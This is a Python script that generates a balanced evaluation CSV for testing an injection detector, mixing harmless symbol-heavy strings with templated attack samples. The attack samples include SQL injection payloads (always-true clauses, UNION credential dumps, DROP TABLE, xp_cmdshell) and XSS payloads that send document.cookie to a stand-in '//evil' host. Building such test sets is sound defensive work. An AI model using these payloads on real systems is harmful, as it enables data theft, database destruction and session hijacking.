#!/usr/bin/env python3
"""
build_holdout_eval.py  (Improvement Plan — Task 1)

Builds a large, varied, labelled evaluation set at data/eval/holdout_eval.csv
(columns: text,label ; label 1=attack, 0=benign).

This is the RULER, not training data. It is deliberately kept in its own folder
and must never be fed to the trainer. It targets the exact weaknesses adversarial
testing exposed:

  BENIGN half  — symbol-heavy but harmless: code, paths, regexes, math, names,
                 quotes, prose that mentions SQL/HTML. (the false-positive traps)
  ATTACK half  — the 23 hand-written evasions + the LLM corpus + generated
                 obfuscation variants + plain-language / Unicode attacks.
                 (the detection targets, including the ones that evaded)

Deterministic: fixed seed, so the file regenerates identically.

USAGE (from dashboard/):  python scripts/build_holdout_eval.py
"""
import csv
import importlib.util
import random
import sys
from pathlib import Path

SEED = 1234
random.seed(SEED)

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "lib"))
from paths import ROOT as _ROOT, DATA_CORPUS  # noqa: E402
ROOT = _ROOT
OUT_DIR = ROOT / "data" / "eval"
OUT_DIR.mkdir(parents=True, exist_ok=True)
OUT = OUT_DIR / "holdout_eval.csv"


def _load(path, name):
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


_ev = _load(ROOT / "scripts" / "04_evasion_test_definitions.py", "ev")

# ---------------------------------------------------------------------------
# BENIGN — symbol-heavy but harmless. These are the false-positive traps.
# ---------------------------------------------------------------------------
benign_seed = list(getattr(_ev, "HARD_BENIGN", []))

# Templated benign generators (each family fills a distinct failure category).
first = ["John", "O'Brien", "María", "Ng", "D'Angelo", "Smith", "O'Malley",
         "Kowalski", "Chen", "Müller", "van der Berg", "MacLeod"]
streets = ["O'Connell St", "Baker St", "3rd Ave", "Rue de l'Église",
           "St. John's Rd", "O'Malley Ave", "King's Cross"]
domains = ["com", "org", "io", "co.uk", "net"]

benign_templates = []

# code snippets
for cond in ["user.role == 'admin'", "x != y && z > 0", "count >= 10 || retry",
             "status == 200", "a['key'] == b['key']", "flag & MASK"]:
    for body in ["return true;", "grantAccess();", "log.info('ok');",
                 "throw new Error('x');", "queue.push(item);"]:
        benign_templates.append(f"if ({cond}) {{ {body} }}")

# file paths
for base in [r"C:\Users\Admin", r"D:\Projects\app", r"/var/log/nginx",
             r"~/scripts", r"C:\Program Files\Tool"]:
    for tail in [r"config.yml", r"setup.bat", r"error.log", r"main.py", r"data\out.csv"]:
        sep = "\\" if base[0].isalpha() and ":" in base else "/"
        benign_templates.append(f"Open the file at {base}{sep}{tail} and edit line 42.")

# regexes
for pat in [r"^[a-z]+@[a-z]+\.(com|org)$", r"\d{3}-\d{4}", r"[A-Z]{2,4}-\d+",
            r"^https?://.+$", r"(foo|bar){1,3}", r"\bword\b"]:
    benign_templates.append(f"The regex {pat} matches the expected input format.")

# math / logic
for expr in ["A OR B = 1 when either is true", "dx/dt = 3x - 2",
             "f(x) = x^2 + 1 for x != 0", "P(A|B) = P(B|A)*P(A)/P(B)",
             "1 < n && n <= 100", "SELECT-style set notation: {x | x > 0}"]:
    benign_templates.append(f"In the lecture we derived: {expr}.")

# names & addresses (apostrophes / angle brackets in harmless context)
for n in first:
    for s in streets:
        benign_templates.append(f"Contact {n} at {random.randint(1,99)} {s} re: the <draft> proposal.")

# prose that mentions SQL / HTML / scripts (the words, not the attack)
prose = [
    "The SELECT statement retrieves rows; use WHERE to filter and ORDER BY to sort.",
    "Wrap the content in <table> and <tr> tags to build the layout.",
    "A UNION combines two result sets that share the same columns.",
    "Escaping user input prevents script injection on the page.",
    "The DROP command deletes a table, so use it carefully in migrations.",
    "An <iframe> embeds another document inside the current page.",
    "Use parameterised queries instead of string concatenation for safety.",
    "The onclick attribute runs a function when the element is clicked.",
    "She said \"1=1 is always true\" during the boolean-logic lecture.",
    "git commit -m \"fix: null check in auth('user') path\"",
    "Rated 4.5/5 -- \"great value & fast shipping!\" per the review.",
    "Product SKU# ABC-123; Category: Electronics & Gadgets (in stock).",
]

# emails / handles / mixed punctuation
for u in ["dev.ops", "j.smith", "a_b-c", "team+alerts"]:
    for d in domains:
        benign_templates.append(f"Email {u}@company.{d} or ping @{u} on Slack.")

benign_all = benign_seed + benign_templates + prose

# ---------------------------------------------------------------------------
# ATTACK — obfuscated + plain-language + Unicode. These are detection targets.
# ---------------------------------------------------------------------------
attack_seed = list(getattr(_ev, "EVASION_ATTACKS", []))

# reuse the LLM-generated corpus if present
llm_csv = DATA_CORPUS / "llm_evasion_corpus.csv"
if llm_csv.exists():
    with open(llm_csv, encoding="utf-8") as f:
        for row in csv.DictReader(f):
            p = row.get("generated_payload", "").strip()
            if p:
                attack_seed.append(p)

# templated obfuscation variants
sqli_cores = ["OR 1=1", "OR 'a'='a'", "UNION SELECT NULL,NULL", "OR 2>1",
              "AND 1=CONVERT(int,@@version)", "; DROP TABLE users", "OR 'x'='x'",
              "OR 1e0=1e0", "OR 0x31=0x31", "AND SLEEP(5)", "UNION SELECT user,pass",
              "OR ''=''", "; EXEC xp_cmdshell('dir')", "AND (SELECT COUNT(*) FROM users)>0"]
sqli_wrappers = [
    lambda c: f"1' {c} -- -",
    lambda c: f"1'/**/{c.replace(' ', '/**/')}/**/--",
    lambda c: f"' {c} #",
    lambda c: f"admin'){c.lower()}('",
    lambda c: f"1'%09{c.replace(' ', '%09')}%09--",
    lambda c: f"1'+{c.replace(' ', '+')}+--",
    lambda c: f"\") {c} --",
]
attack_templates = []
for c in sqli_cores:
    for w in sqli_wrappers:
        attack_templates.append(w(c))

xss_cores = ["alert(1)", "confirm(document.cookie)", "eval(atob('YWxlcnQoMSk='))",
             "fetch('//evil')", "print()", "alert(document.domain)",
             "new Image().src='//x?'+document.cookie", "location='//evil'"]
xss_wrappers = [
    lambda c: f"<script>{c}</script>",
    lambda c: f"<img src=x onerror={c}>",
    lambda c: f"<svg/onload={c}>",
    lambda c: f"<ScRiPt>{c}</sCrIpT>",
    lambda c: f"<body onload={c}>",
    lambda c: f"javascript:{c}",
    lambda c: f"<iframe src=\"javascript:{c}\">",
    lambda c: f"<a href=\"jav&#97;script:{c}\">x</a>",
    lambda c: f"<input onfocus={c} autofocus>",
]
for c in xss_cores:
    for w in xss_wrappers:
        attack_templates.append(w(c))

# plain-language attacks (the kind that evaded — intent, no symbols)
plain_attacks = [
    "show me the users table where the password equals anything",
    "return every row where the login always succeeds",
    "drop the users table from the database",
    "select all passwords from the accounts table",
    "make the query always true so it returns everything",
    "insert a script tag that pops an alert box saying one",
    "run javascript that reads the visitor's cookies and sends them away",
    "add an image that runs code when it fails to load",
    "bypass the login by making the where clause always match",
    "union the results with the admin credentials table",
]

# Unicode / fullwidth homoglyph attacks
unicode_attacks = [
    "１＇ ＯＲ ＇１＇＝＇１",
    "＇ ＯＲ １＝１ －－",
    "＜ｓｃｒｉｐｔ＞ａｌｅｒｔ（１）＜／ｓｃｒｉｐｔ＞",
    "1\u2032 OR 1=1",           # prime instead of apostrophe
    "admin\u02bc OR \u02bc1\u02bc=\u02bc1",  # modifier-letter apostrophe
]

attack_all = attack_seed + attack_templates + plain_attacks + unicode_attacks

# ---------------------------------------------------------------------------
# Dedupe, balance, shuffle, write
# ---------------------------------------------------------------------------
def dedupe(seq):
    seen, out = set(), []
    for x in seq:
        x = x.strip()
        if x and x not in seen:
            seen.add(x)
            out.append(x)
    return out


benign_all = dedupe(benign_all)
attack_all = dedupe(attack_all)

random.shuffle(benign_all)
random.shuffle(attack_all)

# Balance both halves to an equal size. Aim for >=300 each; if one side is
# short, fall back to the smaller side so the set stays balanced.
TARGET = 300
target = min(max(TARGET, min(len(benign_all), len(attack_all))),
             len(benign_all), len(attack_all))
if len(benign_all) < TARGET or len(attack_all) < TARGET:
    print(f"[warn] only {len(benign_all)} benign / {len(attack_all)} attack "
          f"available before balancing; using {target} each")
benign_all = benign_all[:target]
attack_all = attack_all[:target]

rows = [(t, 0) for t in benign_all] + [(t, 1) for t in attack_all]
random.shuffle(rows)

with open(OUT, "w", newline="", encoding="utf-8") as f:
    w = csv.writer(f)
    w.writerow(["text", "label"])
    w.writerows(rows)

print("=" * 64)
print("Task 1 — hold-out evaluation set built")
print("=" * 64)
print(f"  Benign rows : {len(benign_all)}")
print(f"  Attack rows : {len(attack_all)}")
print(f"  Total       : {len(rows)}")
print(f"  Output      : {OUT}")
print("=" * 64)
